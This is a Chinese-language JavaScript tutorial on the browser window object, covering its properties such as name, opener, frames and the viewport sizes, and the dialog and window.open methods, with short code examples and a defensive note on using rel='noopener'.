<h2 id="二、window-对象"><a href="#二、window-对象" class="headerlink" title="二、window 对象"></a>二、window 对象</h2><h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><p>浏览器里面，<code>window</code>对象（注意，<code>w</code>为小写）<strong>指当前的浏览器窗口。它也是当前页面的顶层对象</strong>，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">a</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>a</code>是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。</p>
<p><code>window</code>有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把<code>window</code>对象当作顶层对象，所有未声明就赋值的变量都自动变成<code>window</code>对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。 </p>
<h3 id="2、window-对象的属性"><a href="#2、window-对象的属性" class="headerlink" title="2、window 对象的属性"></a>2、window 对象的属性</h3><h4 id="2-1-window-name-浏览器窗口的名字，默认空字符串"><a href="#2-1-window-name-浏览器窗口的名字，默认空字符串" class="headerlink" title="2.1 window.name 浏览器窗口的名字，默认空字符串"></a>2.1 window.name 浏览器窗口的名字，默认空字符串</h4><p><code>window.name</code>属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的<code>target</code>属性使用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">name</span>)</span><br><span class="line"><span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>

<p>该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。</p>
<p>只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问<code>a.com</code>时，该页面的脚本设置了<code>window.name</code>，接下来在同一个窗口里面载入了<code>b.com</code>，新页面的脚本可以读到上一个网页设置的<code>window.name</code>。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。</p>
<blockquote>
<p>笔记：该属性是定义在浏览器窗口对象window上的，跟访问的站点没有关系，就是说定义了该属性，再访问其他站点时，该属性依然存在。</p>
</blockquote>
<h4 id="2-2-window-closed-窗口是否关闭，window-opener-打开当前窗口的父窗口对象"><a href="#2-2-window-closed-窗口是否关闭，window-opener-打开当前窗口的父窗口对象" class="headerlink" title="2.2 window.closed 窗口是否关闭，window.opener 打开当前窗口的父窗口对象"></a>2.2 window.closed 窗口是否关闭，window.opener 打开当前窗口的父窗口对象</h4><p><code>window.closed</code>属性返回一个布尔值，表示<strong>窗口是否关闭</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">closed</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。<strong>这个属性一般用来检查，使用脚本打开的新窗口是否关闭。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((popup !== <span class="literal">null</span>) &amp;&amp; !popup.<span class="property">closed</span>) &#123;</span><br><span class="line">  <span class="comment">// 窗口仍然打开着</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>window.opener</code>属性表示<strong>打开当前窗口的父窗口对象</strong>。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>().<span class="property">opener</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面表达式会打开一个新窗口，然后返回<code>true</code>。</p>
<p>如果两个窗口之间不需要通信，建议将子窗口的<code>opener</code>属性显式设为<code>null</code>，这样可以减少一些安全隐患。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newWin = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;example.html&#x27;</span>, <span class="string">&#x27;newWindow&#x27;</span>, <span class="string">&#x27;height=400,width=400&#x27;</span>);</span><br><span class="line">newWin.<span class="property">opener</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码中，子窗口的<code>opener</code>属性设为<code>null</code>，两个窗口之间就没办法再联系了。</p>
<p><strong>通过<code>opener</code>属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开</strong>。<code> &lt;a&gt; </code>元素添加<code>rel=&quot;noopener&quot;</code>属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://an.evil.site&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span></span><br><span class="line">恶意网站</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-window-self，window-window-都指向窗口本身，只读"><a href="#2-3-window-self，window-window-都指向窗口本身，只读" class="headerlink" title="2.3 window.self，window.window 都指向窗口本身，只读"></a>2.3 window.self，window.window 都指向窗口本身，只读</h4><p><code>window.self</code>和<code>window.window</code>属性都<strong>指向窗口本身</strong>。这两个属性<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">self</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">window</span> === <span class="variable language_">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="2-4-window-frames-类数组-i-frame集合，window-length返回-i-frame总数"><a href="#2-4-window-frames-类数组-i-frame集合，window-length返回-i-frame总数" class="headerlink" title="2.4 window.frames 类数组(i)frame集合，window.length返回(i)frame总数"></a>2.4 window.frames 类数组(i)frame集合，window.length返回(i)frame总数</h4><p><code>window.frames</code>属性<strong>返回一个类似数组的对象，成员为页面内所有框架窗口，包括<code>frame</code>元素和<code>iframe</code>元素</strong>。<code>window.frames[0]</code>表示页面中第一个框架窗口。</p>
<p>如果<code>iframe</code>元素设置了<code>id</code>或<code>name</code>属性，那么就可以用属性值，引用这个<code>iframe</code>窗口。比如<code> &lt;iframe name=&quot;myIFrame&quot;&gt; </code>可以用<code>frames[&#39;myIFrame&#39;]</code>或者<code>frames.myIFrame</code>来引用。</p>
<p><code>frames</code>属性实际上是<code>window</code>对象的别名。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames === <span class="variable language_">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>因此，<code>frames[0]</code>也可以用<code>window[0]</code>表示。但是，从语义上看，<code>frames</code>更清晰，而且考虑到<code>window</code>还是全局对象，因此推荐表示多窗口时，总是使用<code>frames[0]</code>的写法。更多介绍请看下文的《多窗口操作》部分。</p>
<p><code>window.length</code>属性<strong>返回当前网页包含的框架总数</strong>。如果当前网页不包含<code>frame</code>和<code>iframe</code>元素，那么<code>window.length</code>就返回<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">frames</span>.<span class="property">length</span> === <span class="variable language_">window</span>.<span class="property">length</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码表示，<code>window.frames.length</code>与<code>window.length</code>应该是相等的。</p>
<h4 id="2-5-window-frameElement-框架元素"><a href="#2-5-window-frameElement-框架元素" class="headerlink" title="2.5 window.frameElement 框架元素"></a>2.5 window.frameElement 框架元素</h4><p><code>window.frameElement</code>属性<strong>主要用于当前窗口嵌在另一个网页的情况</strong>（嵌入<code>&lt;object&gt;</code>、<code> &lt;iframe&gt; </code>或<code>&lt;embed&gt;</code>元素），<strong>返回当前窗口所在的那个元素节点</strong>。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;iframe src=&quot;about.html&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的脚本在 about.html 里面</span></span><br><span class="line"><span class="keyword">var</span> frameEl = <span class="variable language_">window</span>.<span class="property">frameElement</span>;</span><br><span class="line"><span class="keyword">if</span> (frameEl) &#123;</span><br><span class="line">  frameEl.<span class="property">src</span> = <span class="string">&#x27;other.html&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>frameEl</code>变量就是<code> &lt;iframe&gt; </code>元素。</p>
<h4 id="2-6-window-top-顶层窗口，window-parent-父窗口"><a href="#2-6-window-top-顶层窗口，window-parent-父窗口" class="headerlink" title="2.6 window.top 顶层窗口，window.parent 父窗口"></a>2.6 window.top 顶层窗口，window.parent 父窗口</h4><p><code>window.top</code>属性<strong>指向最顶层窗口</strong>，主要用于在框架窗口（frame）里面获取顶层窗口。</p>
<p><code>window.parent</code>属性<strong>指向父窗口</strong>。如果当前窗口没有父窗口，<code>window.parent</code>指向自身。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">parent</span> !== <span class="variable language_">window</span>.<span class="property">top</span>) &#123;</span><br><span class="line">  <span class="comment">// 表明当前窗口嵌入不止一层</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于不包含框架的网页，这两个属性等同于<code>window</code>对象。</p>
<h4 id="2-7-window-status-读写状态栏文本"><a href="#2-7-window-status-读写状态栏文本" class="headerlink" title="2.7 window.status 读写状态栏文本"></a>2.7 window.status 读写状态栏文本</h4><p><code>window.status</code>属性<strong>用于读写浏览器状态栏的文本</strong>。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。</p>
<h4 id="2-8-window-devicePixelRatio-样式像素与物理像素比"><a href="#2-8-window-devicePixelRatio-样式像素与物理像素比" class="headerlink" title="2.8 window.devicePixelRatio 样式像素与物理像素比"></a>2.8 window.devicePixelRatio 样式像素与物理像素比</h4><p><code>window.devicePixelRatio</code>属性<strong>返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率</strong>。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。</p>
<h4 id="2-9-位置大小属性"><a href="#2-9-位置大小属性" class="headerlink" title="2.9 位置大小属性"></a>2.9 位置大小属性</h4><h5 id="（1）window-screenX，window-screenY-窗口与屏幕左上角的X、Y距离"><a href="#（1）window-screenX，window-screenY-窗口与屏幕左上角的X、Y距离" class="headerlink" title="（1）window.screenX，window.screenY 窗口与屏幕左上角的X、Y距离"></a>（1）window.screenX，window.screenY 窗口与屏幕左上角的X、Y距离</h5><p><code>window.screenX</code>和<code>window.screenY</code>属性，<strong>返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）</strong>。这两个属性<strong>只读</strong>。</p>
<h5 id="（2）-window-innerHeight，window-innerWidth-视口的宽高"><a href="#（2）-window-innerHeight，window-innerWidth-视口的宽高" class="headerlink" title="（2） window.innerHeight，window.innerWidth 视口的宽高"></a>（2） window.innerHeight，window.innerWidth 视口的宽高</h5><p><code>window.innerHeight</code>和<code>window.innerWidth</code>属性，返回<strong>网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）</strong>。这两个属性<strong>只读</strong>。</p>
<p>用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因为可见部分（视口）就变小了。</p>
<p>注意，这两个属性值包括滚动条的高度和宽度。</p>
<h5 id="（3）window-outerHeight，window-outerWidth-整体窗口宽高"><a href="#（3）window-outerHeight，window-outerWidth-整体窗口宽高" class="headerlink" title="（3）window.outerHeight，window.outerWidth 整体窗口宽高"></a>（3）window.outerHeight，window.outerWidth 整体窗口宽高</h5><p><code>window.outerHeight</code>和<code>window.outerWidth</code>属性<strong>返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）</strong>。这两个属性<strong>只读</strong>。</p>
<h5 id="（4）window-scrollX，window-scrollY-窗口水平-垂直滚动距离"><a href="#（4）window-scrollX，window-scrollY-窗口水平-垂直滚动距离" class="headerlink" title="（4）window.scrollX，window.scrollY 窗口水平&#x2F;垂直滚动距离"></a>（4）window.scrollX，window.scrollY 窗口水平&#x2F;垂直滚动距离</h5><p><code>window.scrollX</code>属性返<strong>回页面的水平滚动距离</strong>，<code>window.scrollY</code>属性<strong>返回页面的垂直滚动距离</strong>，单位都为像素。这两个属性<strong>只读</strong>。</p>
<p>注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是<code>0</code>。</p>
<p>举例来说，如果用户向下拉动了垂直滚动条75像素，那么<code>window.scrollY</code>就是75左右。用户水平向右拉动水平滚动条200像素，<code>window.scrollX</code>就是200左右。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">scrollY</span> &lt; <span class="number">75</span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">scroll</span>(<span class="number">0</span>, <span class="number">75</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。</p>
<h5 id="（5）window-pageXOffset，window-pageYOffset-别名，同（4）"><a href="#（5）window-pageXOffset，window-pageYOffset-别名，同（4）" class="headerlink" title="（5）window.pageXOffset，window.pageYOffset  别名，同（4）,"></a>（5）window.pageXOffset，window.pageYOffset  别名，同（4）,</h5><p><code>window.pageXOffset</code>属性和<code>window.pageYOffset</code>属性，是<code>window.scrollX</code>和<code>window.scrollY</code>别名。</p>
<h4 id="2-10-组件属性-（浏览器的组件对象，如地址栏等）"><a href="#2-10-组件属性-（浏览器的组件对象，如地址栏等）" class="headerlink" title="2.10 组件属性 （浏览器的组件对象，如地址栏等）"></a>2.10 组件属性 （浏览器的组件对象，如地址栏等）</h4><p>组件属性<strong>返回浏览器的组件对象</strong>。这样的属性有下面几个。</p>
<ul>
<li><code>window.locationbar</code>：地址栏对象</li>
<li><code>window.menubar</code>：菜单栏对象</li>
<li><code>window.scrollbars</code>：窗口的滚动条对象</li>
<li><code>window.toolbar</code>：工具栏对象</li>
<li><code>window.statusbar</code>：状态栏对象</li>
<li><code>window.personalbar</code>：用户安装的个人工具栏对象</li>
</ul>
<p>这些对象的<code>visible</code>属性是一个布尔值，表示<strong>这些组件是否可见</strong>。这些属性<strong>只读</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">locationbar</span>.<span class="property">visible</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">menubar</span>.<span class="property">visible</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">scrollbars</span>.<span class="property">visible</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">toolbar</span>.<span class="property">visible</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">statusbar</span>.<span class="property">visible</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">personalbar</span>.<span class="property">visible</span></span><br></pre></td></tr></table></figure>



<h4 id="2-11-全局对象属性"><a href="#2-11-全局对象属性" class="headerlink" title="2.11 全局对象属性"></a>2.11 全局对象属性</h4><p>全局对象属性指向一些浏览器原生的全局对象。</p>
<ul>
<li><code>window.document</code>：指向<code>document</code>对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。<strong>【文档对象】</strong></li>
<li><code>window.location</code>：指向<code>Location</code>对象，用于获取当前窗口的 URL 信息。它等同于<code>document.location</code>属性，详见《Location 对象》一章。<strong>【URL信息对象】</strong></li>
<li><code>window.navigator</code>：指向<code>Navigator</code>对象，用于<strong>获取环境信息</strong>，详见《Navigator 对象》一章。</li>
<li><code>window.history</code>：指向<code>History</code>对象，表示浏览器的<strong>浏览历史</strong>，详见《History 对象》一章。</li>
<li><code>window.localStorage</code>：指向<strong>本地储存的 localStorage 数据</strong>，详见《Storage 接口》一章。</li>
<li><code>window.sessionStorage</code>：指向<strong>本地储存的 sessionStorage 数据</strong>，详见《Storage 接口》一章。</li>
<li><code>window.console</code>：指向<code>console</code>对象，用于<strong>操作控制台</strong>，详见《console 对象》一章。</li>
<li><code>window.screen</code>：指向<code>Screen</code>对象，表示<strong>屏幕信息</strong>，详见《Screen 对象》一章。</li>
</ul>
<h4 id="2-12-window-isSecureContext-是否在加密环境，https协议为true"><a href="#2-12-window-isSecureContext-是否在加密环境，https协议为true" class="headerlink" title="2.12 window.isSecureContext 是否在加密环境，https协议为true"></a>2.12 window.isSecureContext 是否在加密环境，https协议为true</h4><p><code>window.isSecureContext</code>属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是<code>true</code>，否则就是<code>false</code>。</p>
<h3 id="3、window-对象的方法"><a href="#3、window-对象的方法" class="headerlink" title="3、window 对象的方法"></a>3、window 对象的方法</h3><h4 id="3-1-window-alert-，window-prompt-，window-confirm"><a href="#3-1-window-alert-，window-prompt-，window-confirm" class="headerlink" title="3.1 window.alert()，window.prompt()，window.confirm()"></a>3.1 window.alert()，window.prompt()，window.confirm()</h4><p><code>window.alert()</code>、<code>window.prompt()</code>、<code>window.confirm()</code>都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。</p>
<p>**（1）window.alert()   对话框 ** </p>
<p><code>window.alert()</code>方法<strong>弹出的对话框，只有一个“确定”按钮</strong>，往往用来通知用户某些信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。</p>
<p><code>window.alert()</code>方法的参数只能是字符串，没法使用 CSS 样式，但是可以用<code>\n</code>指定换行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;本条提示\n分成两行&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>（2）window.prompt() 对话框，返回输入值</strong></p>
<p><code>window.prompt()</code>方法<strong>弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="title function_">prompt</span>(<span class="string">&#x27;您的年龄？&#x27;</span>, <span class="number">25</span>) <span class="comment">// 弹窗对话输入框，包含提示文字，和默认已输入的文字&#x27;25&#x27;,确定后返回给result</span></span><br></pre></td></tr></table></figure>

<p>上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量<code>result</code>。</p>
<p><code>window.prompt()</code>的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是<code>null</code>。具体分成三种情况。</p>
<ol>
<li>用户输入信息，并点击“确定”，则用户输入的信息就是返回值。</li>
<li>用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。</li>
<li>用户点击了“取消”（或者按了 ESC 按钮），则返回值是<code>null</code>。</li>
</ol>
<p><code>window.prompt()</code>方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。</p>
<p>**（3）window.confirm() 对话框，返回布尔值 **</p>
<p><code>window.confirm()</code>方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="title function_">confirm</span>(<span class="string">&#x27;你最近好吗？&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。</p>
<p><code>confirm</code>方法<strong>返回一个布尔值，如果用户点击“确定”，返回<code>true</code>；如果用户点击“取消”，则返回<code>false</code>。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> okay = <span class="title function_">confirm</span>(<span class="string">&#x27;Please confirm this message.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (okay) &#123;</span><br><span class="line">  <span class="comment">// 用户按下“确定”</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 用户按下“取消”</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>confirm</code>的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onunload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&#x27;你确定要离开当面页面吗？&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。</p>
<h4 id="3-2-window-open-window-close-，window-stop"><a href="#3-2-window-open-window-close-，window-stop" class="headerlink" title="3.2 window.open(), window.close()，window.stop()"></a>3.2 window.open(), window.close()，window.stop()</h4><p><strong>（1）window.open() 打开一个新窗口</strong> </p>
<p><code>window.open</code>方法用于<strong>新建另一个浏览器窗口</strong>，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;somefile.html&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的<code>somefile.html</code>。</p>
<p><code>open</code>方法一共可以接受三个参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(url, windowName, [windowFeatures])</span><br></pre></td></tr></table></figure>

<ul>
<li><code>url</code>：字符串，表示新窗口的网址。如果省略，默认网址就是<code>about:blank</code>。</li>
<li><code>windowName</code>：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用<code>_blank</code>，表示新建一个没有名字的窗口。另外还有几个预设值，<code>_self</code>表示当前窗口，<code>_top</code>表示顶层窗口，<code>_parent</code>表示上一层窗口。</li>
<li><code>windowFeatures</code>：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(</span><br><span class="line">  <span class="string">&#x27;somepage.html&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;DefinitionsWindows&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。</p>
<p>第三个参数可以设定如下属性。</p>
<ul>
<li>left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。</li>
<li>top：新窗口距离屏幕最顶部的距离（单位像素）。</li>
<li>height：新窗口内容区域的高度（单位像素），不得小于100。</li>
<li>width：新窗口内容区域的宽度（单位像素），不得小于100。</li>
<li>outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。</li>
<li>outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。</li>
<li>menubar：是否显示菜单栏。</li>
<li>toolbar：是否显示工具栏。</li>
<li>location：是否显示地址栏。</li>
<li>personalbar：是否显示用户自己安装的工具栏。</li>
<li>status：是否显示状态栏。</li>
<li>dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。</li>
<li>minimizable：是否有最小化按钮，前提是<code>dialog=yes</code>。</li>
<li>noopener：新窗口将与父窗口切断联系，即新窗口的<code>window.opener</code>属性返回<code>null</code>，父窗口的<code>window.open()</code>方法也返回<code>null</code>。</li>
<li>resizable：新窗口是否可以调节大小。</li>
<li>scrollbars：是否允许新窗口出现滚动条。</li>
<li>dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。</li>
<li>titlebar：新窗口是否显示标题栏。</li>
<li>alwaysRaised：是否显示在所有窗口的顶部。</li>
<li>alwaysLowered：是否显示在父窗口的底下。</li>
<li>close：新窗口是否显示关闭按钮。</li>
</ul>
<p>对于那些可以打开和关闭的属性，设为<code>yes</code>或<code>1</code>或不设任何值就表示打开，比如<code>status=yes</code>、<code>status=1</code>、<code>status</code>都会得到同样的结果。如果想设为关闭，不用写<code>no</code>，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的<code>yes/no</code>属性都会被设成<code>no</code>，只有<code>titlebar</code>和关闭按钮除外（它们的值默认为<code>yes</code>）。</p>
<p>上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另外，<code>open()</code>方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许<code>open</code>方法指向该窗口。</p>
<p><code>window.open</code>方法返回新窗口的引用。</p>
